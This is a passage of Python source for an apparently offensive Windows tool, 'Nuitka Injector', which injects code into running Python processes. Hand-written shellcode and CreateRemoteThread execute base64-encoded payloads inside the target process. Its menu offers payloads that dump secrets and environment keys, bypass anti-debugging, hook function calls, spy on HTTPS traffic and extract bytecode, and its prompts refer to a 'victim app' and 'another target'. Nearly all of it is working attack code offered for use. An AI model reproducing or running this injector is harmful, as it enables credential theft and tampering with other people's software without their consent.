    lines.append(f"[*] CODE OBJECTS: {len(code_objects)}")
    lines.append(f"{'='*60}")
    for c in code_objects[:200]:
        args_s = ', '.join(c['args'])
        lines.append(f"  code '{c['name']}({args_s})'  size={c['size']}  [{c['file']}:{c['line']}]")
    
    lines.append("")
    lines.append(f"{'='*60}")
    lines.append(f"[*] NUITKA / INTERNAL MODULES: {len(nuitka_modules)}")
    lines.append(f"{'='*60}")
    for nm in nuitka_modules:
        lines.append(f"  {nm['name']}  ->  {nm['file']}")
    
    lines.append("")
    lines.append(f"[*] Summary: {len(nuitka_funcs)} nuitka funcs, {len(regular_funcs)} py funcs, "
                 f"{len(class_objects)} classes, {len(code_objects)} code objects")
    
    save_log("nuitka_explorer.txt", lines)

try: run()
except: pass
"""


def payload_bytecode_extractor() -> str:
    return get_common_header() + r"""
import gc
import types
import marshal
import os
import dis
import io

def run():
    lines = ["[*] Bytecode Extractor — dumping all code objects from memory"]
    lines.append("[!] NOTE: Nuitka compiles Python -> C. Primary logic will NOT have CodeType objects.")
    lines.append("[!]        This payload is designed for: PyInstaller, mixed Nuitka builds,")
    lines.append("[!]        stdlib/dependencies still loaded as .pyc, and PyArmor targets.")
    
    dump_dir = os.path.join(os.environ.get("TEMP", "C:\\"), "nuitka_bytecode_dump")
    try:
        os.makedirs(dump_dir, exist_ok=True)
    except:
        dump_dir = "C:\\nuitka_bytecode_dump"
        os.makedirs(dump_dir, exist_ok=True)
    
    lines.append(f"[*] Dump directory: {dump_dir}")
    
    code_objects = []
    func_objects = []
    
    try:
        all_objects = gc.get_objects()
        for obj in all_objects:
            try:
                if isinstance(obj, types.CodeType):
                    code_objects.append(obj)
                elif isinstance(obj, types.FunctionType):
                    func_objects.append(obj)
                    if hasattr(obj, '__code__') and isinstance(obj.__code__, types.CodeType):
                        code_objects.append(obj.__code__)
            except: continue
    except Exception as e:
        lines.append(f"[-] GC scan error: {e}")
    
    # deduplicate by id
    seen = set()
    unique_codes = []
    for co in code_objects:
        if id(co) not in seen:
            seen.add(id(co))
            unique_codes.append(co)
    
    lines.append(f"[*] Found {len(unique_codes)} unique code objects")
    lines.append(f"[*] Found {len(func_objects)} function objects")
    
    # Dump each code object
    dumped = 0
    for i, co in enumerate(unique_codes):
        try:
            name = co.co_name or f'anonymous_{i}'
            safe_name = ''.join(c if c.isalnum() or c in '_-.' else '_' for c in name)
            filename = co.co_filename or 'unknown'
            safe_fn = ''.join(c if c.isalnum() or c in '_-.' else '_' for c in os.path.basename(filename))
            
            prefix = f"{i:04d}_{safe_fn}_{safe_name}"
            
            # 1. Marshal dump (.pyc-compatible)
            try:
                marshal_path = os.path.join(dump_dir, f"{prefix}.marshal")
                with open(marshal_path, 'wb') as f:
                    marshal.dump(co, f)
            except: pass
            
            # 2. Disassembly dump
            try:
                dis_path = os.path.join(dump_dir, f"{prefix}.dis")
                sio = io.StringIO()
                dis.dis(co, file=sio)
                with open(dis_path, 'w', encoding='utf-8') as f:
                    f.write(f"# Code object: {co.co_name}\n")
                    f.write(f"# File: {co.co_filename}\n")
                    f.write(f"# Line: {co.co_firstlineno}\n")
                    f.write(f"# Args: {co.co_varnames[:co.co_argcount]}\n")
                    f.write(f"# Locals: {co.co_varnames}\n")
                    f.write(f"# Consts: {co.co_consts}\n")
                    f.write(f"# Names: {co.co_names}\n")
                    f.write(f"\n# === Disassembly ===\n")
                    f.write(sio.getvalue())
            except: pass
            
            # 3. Info for the main log
            args = list(co.co_varnames[:co.co_argcount])
            consts_preview = []
            for c in co.co_consts:
                if isinstance(c, (str, int, float, bytes)) and c is not None:
                    s = repr(c)
                    if len(s) > 60: s = s[:57] + '...'
                    consts_preview.append(s)
            
            lines.append(f"")
            lines.append(f"[{i}] {co.co_name}({', '.join(args)})  [{co.co_filename}:{co.co_firstlineno}]")
            lines.append(f"     bytecode size: {len(co.co_code)}  locals: {len(co.co_varnames)}  stacksize: {co.co_stacksize}")
            if consts_preview:
                lines.append(f"     consts: {', '.join(consts_preview[:10])}")
            
            dumped += 1
        except:
            continue
    
    # Also dump function defaults and closures
    lines.append("")
    lines.append("=" * 50)
    lines.append(f"[*] Function Defaults & Closures:")
    for fn in func_objects[:200]:
        try:
            name = getattr(fn, '__qualname__', fn.__name__)
            defaults = fn.__defaults__
            kwdefaults = fn.__kwdefaults__
            closure = fn.__closure__
            
            extra = []
            if defaults: extra.append(f"defaults={defaults}")
            if kwdefaults: extra.append(f"kwdefaults={kwdefaults}")
            if closure:
                cells = []
                for cell in closure:
                    try: cells.append(repr(cell.cell_contents)[:80])
                    except: cells.append('<empty>')
                extra.append(f"closure={cells}")
            
            if extra:
                lines.append(f"  {name}: {', '.join(extra)}")
        except: continue
    
    lines.append("")
    lines.append(f"[*] Total dumped: {dumped} code objects to {dump_dir}")
    lines.append("[*] Use: python -c \"import marshal,dis; co=marshal.load(open('file.marshal','rb')); dis.dis(co)\"")
    lines.append("[*] Or use uncompyle6/decompyle3 to recover source from .marshal files.")
    
    save_log("nuitka_bytecode.txt", lines)

try: run()
except: pass
"""

def _aob_scan_module(pm, module_handle, module_size, pattern: bytes) -> int:
    """Scan a module's memory for a byte pattern (AOB scan).
    Returns the address of the first match or 0."""
    try:
        CHUNK = 0x10000
        base = module_handle
        for offset in range(0, module_size, CHUNK):
            read_size = min(CHUNK, module_size - offset)
            try:
                data = pm.read_bytes(base + offset, read_size)
            except:
                continue
            idx = data.find(pattern)
            if idx != -1:
                return base + offset + idx
    except:
        pass
    return 0


_AOB_PATTERNS = {
    'PyRun_SimpleString': {
        'x64': [b'\x48\x83\xEC\x28\x33\xD2'],
        'x86': [b'\x6A\x00\xFF\x74\x24'],
    },
    'PyGILState_Ensure': {
        'x64': [b'\x48\x89\x5C\x24'],
        'x86': [b'\x53\x56\x57'],
    },
}


def get_remote_func(pm, dll_path, func_name):
    try:
        pe = pefile.PE(dll_path)
        
        func_rva = None
        func_name_b = func_name.encode('utf-8') 
        
        export_directory = None
        for d in pe.OPTIONAL_HEADER.DATA_DIRECTORY:
            if d.name == 'IMAGE_DIRECTORY_ENTRY_EXPORT':
                export_directory = d
                break

        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name and exp.name == func_name_b:
                    
                    if export_directory and \
                       export_directory.VirtualAddress <= exp.address < export_directory.VirtualAddress + export_directory.Size:
                        console.print(f"[yellow][!] Skipped forwarder export: {func_name}[/yellow]")
                        return 0
                        
                    func_rva = exp.address
                    break
        
        pe.close()
        
        if func_rva:
            remote_mod = pymem.process.module_from_name(pm.process_handle, os.path.basename(dll_path))
            if remote_mod:
                return remote_mod.lpBaseOfDll + func_rva
        
        if not func_rva:
            console.print(f"[yellow][!] Export '{func_name}' not found in EAT, trying AOB scan...[/yellow]")
            remote_mod = pymem.process.module_from_name(pm.process_handle, os.path.basename(dll_path))
            if remote_mod and func_name in _AOB_PATTERNS:
                arch_key = 'x64'  # default
                try:
                    sys_info = SYSTEM_INFO()
                    kernel32.GetNativeSystemInfo(ctypes.byref(sys_info))
                    wow64 = ctypes.c_bool()
                    h = kernel32.OpenProcess(0x1000, False, pm.process_id)
                    if h and kernel32.IsWow64Process(h, ctypes.byref(wow64)):
                        arch_key = 'x86' if wow64.value else 'x64'
                    if h: kernel32.CloseHandle(h)
                except:
                    pass
                
                patterns = _AOB_PATTERNS[func_name].get(arch_key, [])
                for pat in patterns:
                    addr = _aob_scan_module(
                        pm, remote_mod.lpBaseOfDll, 
                        remote_mod.SizeOfImage, pat
                    )
                    if addr:
                        console.print(f"[green][+] AOB match for '{func_name}' at 0x{addr:X}[/green]")
                        return addr
            
            console.print(f"[red][!] AOB scan failed for '{func_name}'[/red]")
        
        return 0

    except Exception as e:
        console.print(f"[red][!] Error resolving address for {func_name}: {e}[/red]")
        return 0

def inject(pid: int, dll_path: str, payload: str, arch: str) -> bool:
    try:
        pm = pymem.Pymem(pid)
        addr_run = get_remote_func(pm, dll_path, "PyRun_SimpleString")
        addr_ensure = get_remote_func(pm, dll_path, "PyGILState_Ensure")
        addr_release = get_remote_func(pm, dll_path, "PyGILState_Release")
        
        if not (addr_run and addr_ensure and addr_release):
            console.print("[red]✗ Failed to resolve Python API (Check arch mismatch)[/red]")
            return False

        payload_b64 = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        loader_code = f"import base64; exec(base64.b64decode('{payload_b64}'))"  
        b_payload = loader_code.encode('utf-8') + b'\x00'

        mem_data = pm.allocate(len(b_payload))
        pm.write_bytes(mem_data, b_payload, len(b_payload))
        
        if arch == "x86":
            # шеллкод для x86 (32 бит)
            pack_fmt = '<I'
            sc = b'\xB8\xAA\xAA\xAA\xAA\xFF\xD0\x89\xC6\x68\xBB\xBB\xBB\xBB\xB8\xCC\xCC\xCC\xCC\xFF\xD0\x83\xC4\x04\x56\xB8\xDD\xDD\xDD\xDD\xFF\xD0\x83\xC4\x04\xC3'
            
            sc = sc.replace(b'\xAA' * 4, struct.pack(pack_fmt, addr_ensure))
            sc = sc.replace(b'\xBB' * 4, struct.pack(pack_fmt, mem_data))
            sc = sc.replace(b'\xCC' * 4, struct.pack(pack_fmt, addr_run))
            sc = sc.replace(b'\xDD' * 4, struct.pack(pack_fmt, addr_release))
            
        else:
            # шеллкод для x64
            pack_fmt = '<Q'
            sc = b'\x48\x83\xEC\x28\x48\xB8\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xFF\xD0\x48\x89\xC3\x48\xB9\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xFF\xD0\x48\x89\xD9\x48\xB8\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xFF\xD0\x48\x83\xC4\x28\xC3'
            
            sc = sc.replace(b'\xAA' * 8, struct.pack(pack_fmt, addr_ensure))
            sc = sc.replace(b'\xBB' * 8, struct.pack(pack_fmt, mem_data))
            sc = sc.replace(b'\xCC' * 8, struct.pack(pack_fmt, addr_run))
            sc = sc.replace(b'\xDD' * 8, struct.pack(pack_fmt, addr_release))

        mem_sc = pm.allocate(len(sc))
        pm.write_bytes(mem_sc, sc, len(sc))
        
        ht = kernel32.CreateRemoteThread(pm.process_handle, None, 0, ctypes.c_void_p(mem_sc), None, 0, None)
        if not ht: return False
        kernel32.WaitForSingleObject(ht, 5000)
        kernel32.CloseHandle(ht)
        return True
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return False


def show_menu():
    table = Table(title="Payload Selection", box=box.ROUNDED, header_style="")
    table.add_column("ID", style="cyan", justify="center")
    table.add_column("Mode", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("1", "Dumper", "Dump variables & secrets from __main__")
    table.add_row("2", "Inspector", "List methods of custom Classes (Universal)")
    table.add_row("3", "Fuzzer", "Call method without args to find signature")
    table.add_row("4", "Payday", "Execute Custom Script")
    table.add_row("5", "Anti-Anti-Debug", "Deep bypass (IsDebugger, NtQuery, FindWindow)")
    table.add_row("6", "Deep Scan", "Scan full memory (GC) for hidden secrets")
    table.add_row("7", "MITM Hook", "Intercept function calls & arguments")
    table.add_row("8", "HTTP Spy", "Log all requests (HTTPS Bypass)")
    table.add_row("9", "Environment", "Dump os.environ (Config & Keys)")
    table.add_row("10", "Trace Logger", "sys.settrace call-graph with args [NEW]")
    table.add_row("11", "Nuitka Explorer", "GC heap scan for compiled objects [NEW]")
    table.add_row("12", "Bytecode Dump", "Extract & disassemble all code objects [NEW]")
    
    console.print(table)

def main():
    banner_text = "Nuitka Injector — created by reverse engineering team\n                  t.me/ReChamo"
    console.print(Panel(banner_text, style="cyan", expand=False))
    
    if not is_admin(): enable_debug_privilege()
    
    while True:
        procs = scan_procs()
        if not procs:
            retry = Prompt.ask("[yellow]No Python processes. Retry?[/yellow] [cyan][Y / N][/cyan]")
            if not retry.lower().startswith('y'): break
            continue
            
        t = Table(show_header=True, header_style="blue", box=box.ROUNDED)
        t.add_column("PID", style="cyan")
        t.add_column("Name")
        t.add_column("Ver", style="yellow")
        t.add_column("DLL")
        for p in procs:
            tag = " [STATIC]" if p.get('static') else ""
            t.add_row(str(p['pid']), p['name'], p['ver'] + tag, p['dll_name'])
        console.print(t)
        
        pid_s = Prompt.ask("\nSelect [cyan]PID[/cyan] (or 'q')")
        if pid_s.lower() == 'q': break
        
        tgt = next((p for p in procs if str(p['pid']) == pid_s), None)
        if not tgt:
            console.print("[red]Invalid PID[/red]")
            continue
            
        show_menu()
        mode = Prompt.ask("Select [cyan]Payload Mode[/cyan] [cyan][1-12/q][/cyan]", 
                         choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "q"], 
                         show_choices=False)
        if mode == 'q': break
        
        payload = ""
        report_file = ""
        
        if mode == "1": payload = payload_dumper(); report_file = "nuitka_full_dump.txt"
        elif mode == "2": payload = payload_inspector(); report_file = "nuitka_inspector.txt"
        elif mode == "3": payload = payload_fuzzer(); report_file = "nuitka_fuzzer_log.txt"
        elif mode == "4": payload = payload_payday(); report_file = "nuitka_payday_log.txt"
        elif mode == "5": payload = payload_anti_anti_debug(); report_file = "nuitka_anti_anti_debug.txt"
        elif mode == "6": payload = payload_deep_scan(); report_file = "nuitka_deepscan.txt"
        elif mode == "7": payload = payload_mitm(); report_file = "nuitka_mitm_log.txt"
        elif mode == "8": payload = payload_http_spy(); report_file = "nuitka_http_spy.txt"
        elif mode == "9": payload = payload_env_dump(); report_file = "nuitka_env.txt"
        elif mode == "10": payload = payload_trace_logger(); report_file = "nuitka_trace.txt"
        elif mode == "11": payload = payload_nuitka_explorer(); report_file = "nuitka_explorer.txt"
        elif mode == "12": payload = payload_bytecode_extractor(); report_file = "nuitka_bytecode.txt"
            
        if inject(tgt['pid'], tgt['dll_path'], payload, tgt['arch']):
            console.print(f"\n[bold green]SUCCESS![/bold green] Payload executed.")
            path = os.path.join(os.environ.get("TEMP", "C:\\"), report_file)
            console.print(f"Report: [underline]{path}[/underline] or C:\\{report_file}\n")
            
            if mode == "7":
                console.print("[bold yellow]NOTE:[/bold yellow] Hook active. Trigger actions in victim app")
                hook_log = os.path.join(os.environ.get('TEMP', 'C:\\'), 'nuitka_mitm_log.txt')
                console.print(f"and check logs at: {hook_log}\n")
        else:
            console.print("\n[bold red]INJECTION FAILED[/bold red]\n")
            
        again = Prompt.ask("Attack another target? [cyan][Y / N][/cyan]")
        if not again.lower().startswith('y'): break

if __name__ == "__main__":
    main()
